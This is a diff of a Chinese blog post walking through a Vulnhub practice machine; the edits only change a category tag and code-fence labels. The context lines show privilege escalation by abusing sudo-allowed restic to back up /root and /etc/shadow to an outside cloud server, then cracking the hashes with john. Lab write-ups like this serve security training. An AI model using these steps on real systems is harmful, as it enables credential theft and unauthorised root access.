@@ -8,7 +8,7 @@ tags:
   - 渗透测试
   - 靶机
   - 提权
-category: Vulnhub
+category: Vulnhub靶场
 draft: false
 pinned: false
 lang: zh-CN
@@ -63,7 +63,7 @@ Web 服务通常是突破口，需要细致地挖掘每一个细节。
 ![](images/Pasted%20image%2020260818104607.png)
 这意味着我们需要在攻击机的 `/etc/hosts` 文件中手动添加域名解析。
 > 注意：由于 `yone.lc` 是一个并不存在于互联网公共 DNS（域名系统）中的“假域名”（这本应该是服务器（靶机）自己在公共 DNS 建立的域名，但是这里的服务器是靶机，因此公共 DNS 没有该域名，需要在kali里面手动添加），所以kali根本不认识它，无法解析出 IP，图片自然就加载失败了。
-```bash
+```
 sudo echo "192.168.197.172    yone.lc" >> /etc/hosts
 ```
 ![](images/Pasted%20image%2020260818105640.png)
@@ -146,7 +146,7 @@ uid=1000(yone) gid=1000(yone) groups=1000(yone)
 ### 4.1 检查 Sudo 权限
 输入 `sudo -l` 查看当前用户能以 root 权限执行哪些命令，且无需root密码（只需要当前用户的密码）。
 
-```bash
+```
 sudo -l
 ```
 ![](images/Pasted%20image%2020260818171408.png)
@@ -165,7 +165,7 @@ sudo -l
 > ⚠️ **网络注意**：由于靶机和攻击机在同一内网，靶机可以主动连接公网，但**不能主动连接内网**，因此反弹 Shell 会失败。所以需要在**公网云服务器**上搭建 `restic` 服务端进行监听，而非在本地 Kali 上。
 
 我使用阿里云服务器，购买成功之后，安装 Golang 和 Restic，然后启动 Restic 服务。
-```bash
+```
 # 安装 Golang 和 Restic
 apt install -y golang restic
 
@@ -183,7 +183,7 @@ CGO_ENABLED=0 go build -o rest-server ./cmd/rest-server
 #### 步骤 2：在靶机上初始化备份仓库
 在靶机 (`yone`) 上，使用 `restic` 客户端初始化一个指向我的服务器的仓库，并设置密码。
 
-```bash
+```
 restic -r rest:http://47.122.104.169:8000/rest1 init
 ```
 此处密码设置为 `123456`。
@@ -191,7 +191,7 @@ restic -r rest:http://47.122.104.169:8000/rest1 init
 #### 步骤 3：以 Root 权限备份敏感文件
 现在，使用 `sudo` 以 root 权限执行 `restic backup` 命令，将 `/root` 目录备份到我的服务器。
 
-```bash
+```
 sudo /usr/bin/restic backup -r rest:http://47.122.104.169:8000/rest1 /root
 ```
 ![](images/Pasted%20image%2020260819130647.png)
@@ -201,7 +201,7 @@ sudo /usr/bin/restic backup -r rest:http://47.122.104.169:8000/rest1 /root
 
 首先查看已备份的快照列表，获取快照 ID：
 
-```bash
+```
 restic -r rest:http://47.122.104.169:8000/rest1 snapshots
 ```
 ![](images/Pasted%20image%2020260819131926.png)
@@ -221,7 +221,7 @@ restic -r rest:http://47.122.104.169:8000/rest1 mount /mnt/restic
 
 在**第二个 SSH 终端**中，使用 `tree` 命令查看挂载点的完整目录结构：
 
-```bash
+```
 tree /mnt/restic
 ```
 ![](images/Pasted%20image%2020260819132547.png)
@@ -229,7 +229,7 @@ tree /mnt/restic
 
 #### 步骤 4：读取 Flag
 
-```bash
+```
 cat /mnt/restic/snapshots/latest/root/root.txt
 ```
 
@@ -248,17 +248,17 @@ unmounting /mnt/restic...
 ### 5.1 备份 Shadow 文件
 
 重复上述备份步骤，可以新建一个 `rest2` 存档，也可以复用之前的仓库，这里直接复用已有的 `rest1` 仓库，备份 `/etc/shadow` 文件：
-```bash
+```
 sudo /usr/bin/restic backup -r rest:http://47.122.104.169:8000/rest1 /etc/shadow
 ```
 ![](images/Pasted%20image%2020260819133002.png)
 备份完成后，此时 `rest1` 仓库中包含两个快照：`/root` 和 `/etc/shadow`。在云服务器上查看所有快照，记下备份 `shadow` 的快照 ID（fb1de187）：
-```bash
+```
 restic -r rest:http://47.122.104.169:8000/rest1 snapshots
 ```
 ![](images/Pasted%20image%2020260819133214.png)
 然后使用 `restore` 提取 `shadow` 文件：
-```bash
+```
 mkdir -p /tmp/shadow_extract
 
 restic -r rest:http://47.122.104.169:8000/rest1 restore fb1de187 --target /tmp/shadow_extract
@@ -271,7 +271,7 @@ restic -r rest:http://47.122.104.169:8000/rest1 restore fb1de187 --target /tmp/s
 
 将之前通过路径遍历获取的 `/etc/passwd` 和现在获取的 `/etc/shadow` 结合，使用 `unshadow` 命令将其转换为可用于破解的哈希格式：
 
-```bash
+```
 unshadow passwd.txt shadow.txt > hash.txt
 ```
 ![](images/Pasted%20image%2020260819134557.png)
@@ -296,7 +296,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 使用破解出的密码切换至 root 用户：
 
-```bash
+```
 su root
 ```
 ![](images/Pasted%20image%2020260819143448.png)
